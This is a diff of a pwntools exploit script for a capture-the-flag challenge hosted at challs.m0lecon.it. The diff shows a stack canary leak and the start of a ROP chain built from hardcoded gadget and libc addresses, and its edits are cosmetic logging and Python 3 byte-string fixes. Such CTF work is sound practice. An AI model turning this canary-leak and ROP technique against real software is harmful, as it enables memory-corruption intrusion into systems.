@@ -1,6 +1,5 @@
 from pwn import *
 
-context.log_level = "debug"
 # p = process
 # p = remote("0.0.0.0",9010)
 HOST = "challs.m0lecon.it"
@@ -16,7 +15,7 @@ def load(offset):
 
 # leak the value of canary
 canary = u64(load(-13))
-print hex(canary)
+log.info("canary --> %s" % hex(canary))
 
 # Address for the payload
 pop_rdi = 0x00000000004014f3
@@ -26,16 +25,16 @@ flag = 0x401518
 mov_rdx = 0x0000000000401528
 
 load = u64(load(-14))
-print hex(load)
+log.info("load --> %s" % hex(load))
 
 base = 0x7ffefa79d660 + 0x90
 
 # Building the ROPchain
 libc_base = 0x7f1c6f581000
 libc_local = 0x7ff84f2a3000
-payload = "EXIT" * 10
+payload = b"EXIT" * 10
 payload += p64(canary)
-payload += "A" * 8
+payload += b"A" * 8
 payload += p64(pop_rdi)
 payload += p64(flag)
 payload += p64(pop_rsi_r15)
